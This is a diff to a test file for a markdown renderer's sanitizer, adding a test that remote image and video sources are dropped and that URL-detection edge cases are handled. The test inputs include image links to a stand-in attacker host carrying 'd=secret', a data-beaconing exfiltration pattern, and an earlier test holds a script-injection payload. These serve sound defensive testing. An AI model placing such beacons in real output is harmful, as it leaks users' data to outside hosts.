@@ -1,7 +1,7 @@
 // Markdown renderer (P5.52): GitHub-flavored features render, and nothing that can run code survives sanitizing.
 
 import { describe, it, expect } from 'vitest';
-import { renderMarkdown, sanitizeHtml } from '../utils/markdown';
+import { renderMarkdown, sanitizeHtml, isRemoteUrl } from '../utils/markdown';
 import { buildPreview, isModelOutput } from '../utils/streamPreview';
 
 const dom = (html) => {
@@ -80,6 +80,22 @@ describe('renderMarkdown', () => {
     const el = dom(renderMarkdown('<iframe src="https://example.com"></iframe><form action="/x"><input name="a"></form><style>body{display:none}</style><p style="position:fixed">p</p><svg><script>alert(1)</script></svg>'));
     expect(el.querySelector('iframe, form, input, style, svg, script')).toBeNull();
     expect(el.querySelector('p').hasAttribute('style')).toBe(false);
+  });
+
+  it('drops remote image and media sources so output cannot beacon data out (SR-25)', () => {
+    const el = dom(renderMarkdown(
+      '![a](https://evil.example/x.png?d=secret) <img src="//evil.example/y.png"> <img src="HTTP://evil.example/z.png">' +
+      ' <video poster="https://evil.example/p.png" src="https://evil.example/v.mp4"></video>' +
+      ' ![local](/assets/logo.png) <img src="data:image/png;base64,iVBORw0KGgo=">'
+    ));
+    expect(el.innerHTML).not.toContain('evil.example');
+    const sources = [...el.querySelectorAll('img')].map((img) => img.getAttribute('src')).filter(Boolean);
+    expect(sources).toEqual(['/assets/logo.png', 'data:image/png;base64,iVBORw0KGgo=']);
+    expect(isRemoteUrl('https://a.example/x')).toBe(true);
+    expect(isRemoteUrl(' //a.example/x')).toBe(true);
+    expect(isRemoteUrl('/\\a.example/x')).toBe(true);
+    expect(isRemoteUrl('images/x.png')).toBe(false);
+    expect(isRemoteUrl('data:image/gif;base64,R0lGOD')).toBe(false);
   });
 
   it('returns an empty string for empty input', () => {
